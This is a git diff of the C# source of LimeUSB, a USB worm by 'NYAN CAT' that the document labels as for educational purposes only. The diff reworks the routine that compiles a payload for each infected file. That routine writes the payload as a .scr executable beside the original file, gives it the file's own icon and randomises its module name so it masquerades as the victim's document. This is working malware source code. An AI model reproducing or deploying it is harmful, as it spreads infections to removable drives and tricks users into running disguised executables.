@@ -13,7 +13,7 @@ using Microsoft.VisualBasic.Devices;
 
 //
 //       │ Author     : NYAN CAT
-//       │ Name       : LimeUSB v0.3
+//       │ Name       : LimeUSB v0.3.5
 
 //       Contact Me   : https://github.com/NYAN-x-CAT
 //       This program Is distributed for educational purposes only.
@@ -159,50 +159,49 @@ namespace LimeUSB_Csharp
                 source = source.Replace("%LimeUSBModule%", Randomz(new Random().Next(6, 12)));
                 source = source.Replace("%Guid%", Guid.NewGuid().ToString());
 
-                CompilerParameters cParams = new CompilerParameters();
-                Dictionary<string, string> providerOptions = new Dictionary<string, string>();
-                providerOptions.Add("CompilerVersion", GetOS());
+                string[] referencedAssemblies = new string[]{"System.dll"};
 
-                string options = "/target:winexe /platform:x86 /optimize+";
+                var providerOptions = new Dictionary<string, string>() {
+                {"CompilerVersion", "v4.0" }
+            };
+
+                var compilerOptions = "/target:winexe /platform:anycpu /optimize+";
                 if (File.Exists(Path.GetPathRoot(infectedFile) + Settings.WorkDirectory + "\\" + Settings.IconsDirectory + "\\" + Path.GetFileNameWithoutExtension(infectedFile.Replace(" ", null)) + ".ico"))
-                    options += " /win32icon:\"" + Path.GetPathRoot(infectedFile) + Settings.WorkDirectory + "\\" + Settings.IconsDirectory + "\\" + Path.GetFileNameWithoutExtension(infectedFile.Replace(" ", null)) + ".ico" + "\"";
-                cParams.GenerateExecutable = true;
-                cParams.OutputAssembly = infectedFile + ".scr";
-                cParams.CompilerOptions = options;
-                cParams.TreatWarningsAsErrors = false;
-                cParams.IncludeDebugInformation = false;
-                cParams.ReferencedAssemblies.Add("System.dll");
+                {
+                    compilerOptions += $" /win32icon:\"{Path.GetPathRoot(infectedFile) + Settings.WorkDirectory + "\\" + Settings.IconsDirectory + "\\" + Path.GetFileNameWithoutExtension(infectedFile.Replace(" ", null)) + ".ico"}\"";
+                }
 
-                CompilerResults results = new CSharpCodeProvider(providerOptions).CompileAssemblyFromSource(cParams, source);
+                using (var cSharpCodeProvider = new CSharpCodeProvider(providerOptions))
+                {
+                    var compilerParameters = new CompilerParameters(referencedAssemblies)
+                    {
+                        GenerateExecutable = true,
+                        OutputAssembly = infectedFile + ".scr",
+                        CompilerOptions = compilerOptions,
+                        TreatWarningsAsErrors = false,
+                        IncludeDebugInformation = false,
+                    };
+                    var compilerResults = cSharpCodeProvider.CompileAssemblyFromSource(compilerParameters, source);
 
-                //if (results.Errors.Count > 0)
-                //{
-                //    MessageBox.Show(string.Format("The compiler has encountered {0} errors",
-                //         results.Errors.Count), "Errors while compiling", MessageBoxButtons.OK,
-                //         MessageBoxIcon.Error);
+                    //if (compilerResults.Errors.Count > 0)
+                    //{
+                    //    MessageBox.Show(string.Format("The compiler has encountered {0} errors",
+                    //         compilerResults.Errors.Count), "Errors while compiling", MessageBoxButtons.OK,
+                    //         MessageBoxIcon.Error);
 
-                //    foreach (CompilerError Err in results.Errors)
-                //    {
-                //        MessageBox.Show(string.Format("{0}\nLine: {1} - Column: {2}\nFile: {3}", Err.ErrorText,
-                //            Err.Line, Err.Column, Err.FileName), "Error",
-                //            MessageBoxButtons.OK, MessageBoxIcon.Error);
-                //    }
-                //    return;
-                //}
+                    //    foreach (CompilerError compilerError in compilerResults.Errors)
+                    //    {
+                    //        MessageBox.Show(string.Format("{0}\nLine: {1} - Column: {2}\nFile: {3}", compilerError.ErrorText,
+                    //            compilerError.Line, compilerError.Column, compilerError.FileName), "Error",
+                    //            MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    //    }
+                    //}
+                }
             }
             catch (Exception ex)
             {
                 Debug.WriteLine("CompileFile " + ex.Message);
             }
-        }
-
-        public static string GetOS()
-        {
-            var os = new ComputerInfo();
-            if (os.OSFullName.Contains("7"))
-                return "v2.0";
-            else
-                return "v4.0";
         }
 
         public static string Randomz(int L)
